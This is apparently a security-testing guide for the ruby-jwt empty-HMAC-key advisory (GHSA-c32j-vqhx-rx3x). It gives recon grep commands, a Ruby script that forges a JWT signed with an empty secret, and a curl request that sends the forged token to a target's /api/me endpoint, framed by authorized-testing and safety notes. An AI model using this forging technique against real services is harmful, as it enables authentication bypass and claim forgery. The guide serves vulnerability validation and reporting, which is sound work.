# ruby-jwt empty HMAC key boundary checks

**Sources:** [GHSA-c32j-vqhx-rx3x](https://github.com/advisories/GHSA-c32j-vqhx-rx3x), [ruby-jwt](https://github.com/jwt/ruby-jwt)  
**Affected package:** RubyGems `jwt` before `2.10.3`, and `3.0.0` through `3.1.x` before `3.2.0`  
**Operator value:** JWT forgery precondition testing for Ruby applications whose HS256/HS384/HS512 verification path can receive `""` or coerced-`nil` HMAC secrets.

## Why this matters

GHSA-c32j-vqhx-rx3x documents a sharp authentication-boundary failure in Ruby's `jwt` gem: HMAC verification can accept an attacker-signed token when the application passes an empty key into `JWT.decode(...)` or returns an empty value from a keyfinder path.

The reusable assessment lesson is not "try `alg=none`". It is: **JWT verifiers that derive HMAC keys dynamically must fail closed when the lookup misses.** Empty strings, `nil.to_s`, default hash values, blank database columns, and fallback arrays can become valid signing material instead of authentication failure.

The advisory-confirmed sink affects HMAC algorithms (`HS256`, `HS384`, `HS512`) through:

- positional verification keys such as `JWT.decode(token, secret, true, algorithm: 'HS256')`;
- block keyfinders that return `""` for an unknown `kid`;
- `key_finder:` callbacks used by `JWT::EncodedToken#verify_signature!`;
- patterns where `nil` is coerced to `""` before verification.

Applications that always pass a non-empty static secret, or whose keyfinder returns `nil`/raises on miss without coercion, are not affected by this specific boundary.

## Recon targets

Prioritize Ruby/Rails services that expose JWT-bearing APIs and show any of these implementation clues during authorized source review or dependency review:

```bash
# Dependency reachability.
grep -R "gem ['\"]jwt['\"]" -n Gemfile Gemfile.lock *.gemspec 2>/dev/null
bundle list 2>/dev/null | grep -i '^  \* jwt '

# Verification and dynamic key lookup patterns.
grep -R "JWT.decode\|verify_signature!\|key_finder\|kid:" -n app lib config 2>/dev/null

grep -R "\.to_s\|Hash.new('')\|default: ''\|ENV\[.*SECRET\].*||.*''" -n app lib config 2>/dev/null
```

High-signal patterns to inspect manually:

- `redis.get("kid:#{kid}").to_s` or cache lookups followed by `.to_s`;
- ORM-backed secret columns with `default: ''`;
- `ENV['JWT_SECRET'] || ''` or blank test/default secrets leaking into production config;
- `Hash.new('')` or a fallback map that returns blank values for unknown issuers/tenants;
- `[primary, fallback]` key arrays where the fallback can be `nil` or blank;
- multi-tenant `kid`, issuer, or client-ID based key lookup without an explicit non-empty check.

## Safe validation workflow

Use a local copy, staging system, or an explicitly authorized test tenant. Do not forge tokens for production users or real accounts.

### 1. Confirm the dependency and algorithm path

Verify both the package version and that the application accepts HMAC-signed JWTs:

```bash
bundle exec ruby -e 'require "jwt"; puts JWT::VERSION::STRING'

grep -R "HS256\|HS384\|HS512\|algorithm:" -n app lib config 2>/dev/null
```

A finding is only in scope for this advisory when the vulnerable `jwt` version and an HMAC verification path are both present.

### 2. Build a canary token with an empty secret

Use a harmless canary subject and a non-privileged role. Keep the token out of screenshots and public notes.

```bash
bundle exec ruby - <<'RUBY'
require 'jwt'

payload = {
  'sub' => 'skillz-wiki-canary',
  'role' => 'canary-only',
  'iat' => Time.now.to_i,
  'exp' => Time.now.to_i + 300
}

puts JWT.encode(payload, '', 'HS256', { 'kid' => 'missing-canary-key' })
RUBY
```

If the application uses issuer, audience, tenant, or client claims before key lookup, mirror only the minimal canary values needed for the controlled test.

### 3. Exercise the miss path, not privileged impact

Submit the canary token to a low-impact endpoint that requires authentication but returns only the current principal, profile metadata, or a harmless health shape.

```bash
base='https://target.example'

curl -sS -D /tmp/jwt-empty-key.headers \
  -o /tmp/jwt-empty-key.body \
  -H "Authorization: Bearer $CANARY_EMPTY_KEY_JWT" \
  "$base/api/me"

head -40 /tmp/jwt-empty-key.headers
jq 'type, (if type == "object" then keys else . end)' /tmp/jwt-empty-key.body 2>/dev/null || head -20 /tmp/jwt-empty-key.body
```

Strong evidence is a response that authenticates the canary token or maps it to a principal when the `kid`/tenant/client key is intentionally absent or blank. Capture response status, route, response shape, and the redacted token header/payload. Do not include the signature or reusable token value.

### 4. Prove the expected boundary with controls

Run controls that separate this bug class from ordinary JWT misconfiguration:

| Control | Expected result |
| --- | --- |
| Same canary token signed with a non-empty wrong secret | Rejected |
| Same payload with unknown `kid` where keyfinder raises or returns literal `nil` | Rejected |
| Legitimate low-privilege token | Accepted only for its own account |
| Empty-key canary against patched `jwt` | Rejected |

If every HMAC token is accepted regardless of signature, report that broader JWT verification failure separately; do not overfit it to this advisory.

## Reporting heuristic

Frame the report around key-lookup fail-open behavior:

- **Expected boundary:** HMAC verification must require a non-empty secret selected for the issuer/tenant/client/`kid`; lookup misses must raise or return a rejected state.
- **Observed bypass:** an unknown or blank key path is coerced to `""`, allowing an attacker to sign a token with an empty HMAC key.
- **Impact:** authentication bypass or claim forgery for endpoints that trust HS256/HS384/HS512 claims after verification.
- **Evidence:** affected `jwt` version, vulnerable lookup snippet, redacted token header/payload, request/response matrix, and canary-only endpoint proof.

## Scope and safety notes

- Use canary identities and low-impact endpoints only; do not forge admin claims unless the engagement explicitly approves that validation.
- Never publish reusable forged tokens, real JWT secrets, or full authorization headers.
- Keep tests inside authorized tenants and accounts. A multi-tenant key miss can affect other customers if tested carelessly.
- Prefer source-level proof plus a harmless `/me`-style request over data-access demonstrations.
